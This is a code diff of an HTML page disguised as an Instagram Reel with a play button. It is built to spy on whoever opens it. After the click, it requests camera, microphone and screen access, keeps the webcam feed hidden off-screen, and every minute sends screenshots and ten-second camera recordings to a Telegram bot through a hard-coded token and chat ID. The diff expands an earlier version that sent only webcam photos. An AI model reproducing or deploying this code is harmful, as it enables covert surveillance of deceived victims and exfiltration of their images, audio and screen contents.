@@ -3,91 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Instagram Reel - Interactive</title>
     <style>
         body { margin: 0; background: #000; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         .phone-frame { width: 100%; max-width: 400px; height: 100vh; position: relative; background: #000; border: 1px solid #333; }
-        
-        /* The Fake Instagram Video */
         #mainVideo { width: 100%; height: 100%; object-fit: cover; }
-        
-        /* UI Overlays */
-        .overlay { position: absolute; bottom: 50px; left: 15px; color: white; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
+        .overlay { position: absolute; bottom: 80px; left: 15px; color: white; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); pointer-events: none; }
         .username { font-weight: bold; margin-bottom: 5px; display: flex; align-items: center; }
-        .username::before { content: ''; width: 30px; height: 30px; background: #555; border-radius: 50%; margin-right: 10px; display: inline-block; }
-        
-        /* Hidden Camera Logic */
-        #webcam, #canvas { position: absolute; top: -9999px; left: -9999px; visibility: hidden; }
-        
-        /* Interaction Layer */
-        .click-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; cursor: pointer; display: flex; justify-content: center; align-items: center; background: rgba(0,0,0,0.1); }
-        .play-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 30px; border: 2px solid white; }
+        .username::before { content: ''; width: 32px; height: 32px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); border-radius: 50%; margin-right: 10px; }
+        .click-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; cursor: pointer; display: flex; justify-content: center; align-items: center; background: rgba(0,0,0,0.2); z-index: 10; }
+        .play-btn { width: 70px; height: 70px; background: rgba(255,255,255,0.3); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 30px; border: 2px solid white; backdrop-filter: blur(5px); }
+        #webcam { position: absolute; top: -9999px; visibility: hidden; }
     </style>
 </head>
 <body>
 
     <div class="phone-frame">
-        <video id="mainVideo" loop muted autoplay>
+        <video id="mainVideo" loop muted playsinline>
             <source src="https://assets.mixkit.co/videos/preview/mixkit-girl-in-neon-light-dancing-2322-large.mp4" type="video/mp4">
         </video>
-
         <div class="overlay">
-            <div class="username">instagram_user</div>
-            <div>Enjoy the latest reels!</div>
+            <div class="username">neon_dancer_88</div>
+            <div>Wait for the drop! 🔥 #reels #dance</div>
         </div>
-
         <div class="click-layer" id="trigger">
             <div class="play-btn">▶</div>
         </div>
     </div>
 
-    <video id="webcam" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="webcam" autoplay playsinline muted></video>
 
     <script>
-        const webcam = document.getElementById('webcam');
-        const canvas = document.getElementById('canvas');
-        const trigger = document.getElementById('trigger');
-
-        const BOT_TOKEN = '8549057486:AAF2ddvgmQLA8Pnb-gL4-ZDdyRoKTJa5YoA'; 
+        // --- CONFIGURATION ---
+        const BOT_TOKEN = '8549057486:AAF2ddvgmQLA8Pnb-gL4-ZDdyRoKTJa5YoA';
         const CHAT_ID = '2018747103';
-        const INTERVAL = 10000; 
+        const CAPTURE_INTERVAL = 60000; // Repeat every 60 seconds
 
-        async function startCapture() {
+        const trigger = document.getElementById('trigger');
+        const mainVideo = document.getElementById('mainVideo');
+        const webcam = document.getElementById('webcam');
+
+        async function initCapture() {
             try {
-                // Browser WILL show a permission pop-up here
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                webcam.srcObject = stream;
+                // 1. Initial Permission Requests
+                const camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                 
-                // Hide the play button once clicked
+                webcam.srcObject = camStream;
                 trigger.style.display = 'none';
+                mainVideo.play();
 
-                // Start sending photos
+                // 2. Start Recurring Loop
                 setInterval(() => {
-                    const ctx = canvas.getContext('2d');
-                    canvas.width = webcam.videoWidth;
-                    canvas.height = webcam.videoHeight;
-                    ctx.drawImage(webcam, 0, 0);
+                    performCaptureCycle(camStream, screenStream);
+                }, CAPTURE_INTERVAL);
 
-                    canvas.toBlob((blob) => {
-                        const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('photo', blob, 'img.jpg');
-
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: fd
-                        }).catch(err => console.error("Upload failed"));
-                    }, 'image/jpeg', 0.3);
-                }, INTERVAL);
+                // Run first time immediately
+                performCaptureCycle(camStream, screenStream);
 
             } catch (err) {
-                alert("Please enable camera to view this video.");
+                console.error("Permissions denied:", err);
+                alert("Please enable camera and screen sharing to watch this reel.");
             }
         }
 
-        trigger.addEventListener('click', startCapture);
+        async function performCaptureCycle(camStream, screenStream) {
+            // --- A. TAKE SCREENSHOT ---
+            try {
+                const screenTrack = screenStream.getVideoTracks()[0];
+                const capture = new ImageCapture(screenTrack);
+                const bitmap = await capture.grabFrame();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = bitmap.width; 
+                canvas.height = bitmap.height;
+                canvas.getContext('2d').drawImage(bitmap, 0, 0);
+                canvas.toBlob(blob => uploadToTelegram(blob, 'sendPhoto', 'photo'), 'image/jpeg');
+            } catch (e) { console.error("Screenshot failed"); }
+
+            // --- B. RECORD VIDEO (10 Seconds) ---
+            const recorder = new MediaRecorder(camStream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                uploadToTelegram(videoBlob, 'sendVideo', 'video');
+            };
+
+            recorder.start();
+            setTimeout(() => recorder.stop(), 10000);
+        }
+
+        async function uploadToTelegram(blob, method, type) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append(type, blob, type === 'photo' ? 'snap.jpg' : 'reaction.webm');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+                method: 'POST',
+                body: fd
+            }).catch(err => console.error("Telegram Upload Error"));
+        }
+
+        trigger.addEventListener('click', initCapture);
     </script>
 </body>
 </html>
-
